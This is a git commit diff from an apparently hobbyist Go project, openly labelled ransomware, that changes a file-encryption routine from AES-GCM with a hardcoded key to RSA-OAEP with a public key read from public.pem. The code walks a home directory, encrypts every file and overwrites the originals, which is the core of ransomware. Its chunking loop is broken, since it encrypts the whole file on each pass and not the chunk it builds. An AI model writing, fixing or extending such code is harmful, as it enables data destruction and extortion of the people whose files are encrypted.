665d6f9d486f2475a7315360c45f4be61c65d805
goddamnnoob <gowthamreddy547@gmail.com>
2021-12-05 20:01:54 +0530

    Implemented public key encryption ransomeware

--- ransomeware/ransomeware.go
+++ ransomeware/ransomeware.go
@@ -1,17 +1,15 @@
 package ransomeware
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
-	"fmt"
-	"io"
+	"crypto/rsa"
+	"crypto/sha512"
+	"crypto/x509"
+	"encoding/pem"
 	"log"
 	"os"
 	"path/filepath"
 )
-
-const key string = "abcdefghijklmnopqrstuvwxyz123456"
 
 func GetAllFiles() {
 	DEBUG := true
@@ -26,15 +24,15 @@ func GetAllFiles() {
 		}
 		homeDir = filepath.Join(homeDir, "/debug/")
 	}
-	fmt.Println(homeDir)
+	//fmt.Println(homeDir)
 	var files []string
 	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
 		if !info.IsDir() && info.Size() > 1 {
 			files = append(files, path)
-			fmt.Println(path)
-			fmt.Println("----------------------------------------------------------------")
+			/*fmt.Println(path)
+			fmt.Println("----------------------------------------------------------------")*/
 			EncryptFile(path)
-			fmt.Println("----------------------------------------------------------------")
+			//fmt.Println("----------------------------------------------------------------")
 
 		}
 		return nil
@@ -42,44 +40,108 @@ func GetAllFiles() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	for _, file := range files {
-		fmt.Println(file)
-	}
+
 	//return files, err
 
 }
 
-func EncryptFile(filepath string) {
-	data, err := os.ReadFile(filepath)
+func EncryptFile(path string) {
+	data, err := os.ReadFile(path)
 	if err != nil {
 		log.Fatal("Error while reading file " + err.Error())
 		return
 	}
-	block, err := aes.NewCipher([]byte(key))
+	//fmt.Println(data)
+	/* Generate public and private key
+	privatekey, err := rsa.GenerateKey(rand.Reader, 4096)
 	if err != nil {
-		log.Fatal("Error while creating new cipher " + err.Error())
+		log.Fatal("Error while generating private key " + err.Error())
 		return
 	}
+	publickey := privatekey.PublicKey
 
-	gcm, err := cipher.NewGCM(block)
+	var privatekeyBytes []byte = x509.MarshalPKCS1PrivateKey(privatekey)
+	privateKeyBlock := &pem.Block{
+		Type:  "RSA PRIVATE KEY",
+		Bytes: privatekeyBytes,
+	}
+	privatePem, err := os.Create("private.pem")
 	if err != nil {
-		log.Fatal("Error while creating new GCM " + err.Error())
-		return
+		fmt.Printf("error when create private.pem: %s \n", err)
+		os.Exit(1)
+	}
+	err = pem.Encode(privatePem, privateKeyBlock)
+	if err != nil {
+		fmt.Printf("error when encode private pem: %s \n", err)
+		os.Exit(1)
 	}
 
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		log.Fatal(err)
-		return
+	// dump public key to file
+	publicKeyBytes, err := x509.MarshalPKIXPublicKey(&publickey)
+	if err != nil {
+		fmt.Printf("error when dumping publickey: %s \n", err)
+		os.Exit(1)
 	}
+	publicKeyBlock := &pem.Block{
+		Type:  "PUBLIC KEY",
+		Bytes: publicKeyBytes,
+	}
+	publicPem, err := os.Create("public.pem")
+	if err != nil {
+		fmt.Printf("error when create public.pem: %s \n", err)
+		os.Exit(1)
+	}
+	err = pem.Encode(publicPem, publicKeyBlock)
+	if err != nil {
+		fmt.Printf("error when encode public pem: %s \n", err)
 
-	cipherText := gcm.Seal(nonce, nonce, data, nil)
+	}*/
+	publicKeyPath, _ := os.Getwd()
+	publicKeyPath = filepath.Join(publicKeyPath, "public.pem")
+	publickey, err := os.ReadFile(publicKeyPath)
+	if err != nil {
+		log.Fatal("Error while reading public.pem " + err.Error())
+	}
+	publicKey, err := convertBytesToPublicKey(publickey)
+	if err != nil {
+		log.Fatal("Error while converting bytes to public key " + err.Error())
+	}
+	//fmt.Println(publicKey)
+	dataBytes := []byte(data)
+	var ciphertext string
+	for i := 0; i < int(len(dataBytes)); i++ {
+		blockData := [512]byte{}
+		for j := 0; i < int(len(dataBytes)) && j < 512; i++ {
+			blockData[j] = dataBytes[i]
+			j++
+		}
+		ct, err := rsa.EncryptOAEP(sha512.New(), rand.Reader, publicKey, []byte(data), []byte(path))
+		if err != nil {
+			log.Fatal("Error while encrypting " + err.Error())
+			os.Exit(0)
+		}
+		ciphertext = ciphertext + string(ct)
+	}
+	//fmt.Println("ciphertext")
 
-	fmt.Println(cipherText)
-
-	err = os.WriteFile(filepath, cipherText, 0777)
+	//fmt.Println(ciphertext)
+	err = os.WriteFile(path, []byte(ciphertext), 0777)
 	if err != nil {
 		log.Fatal("Error while writing data to file " + err.Error())
 		return
 	}
+}
+
+func convertBytesToPublicKey(keyBytes []byte) (*rsa.PublicKey, error) {
+	var err error
+
+	block, _ := pem.Decode(keyBytes)
+	blockBytes := block.Bytes
+
+	publicKey, err := x509.ParsePKIXPublicKey(blockBytes)
+	if err != nil {
+		return nil, err
+	}
+	PublicKey := publicKey.(*rsa.PublicKey)
+	return PublicKey, nil
 }
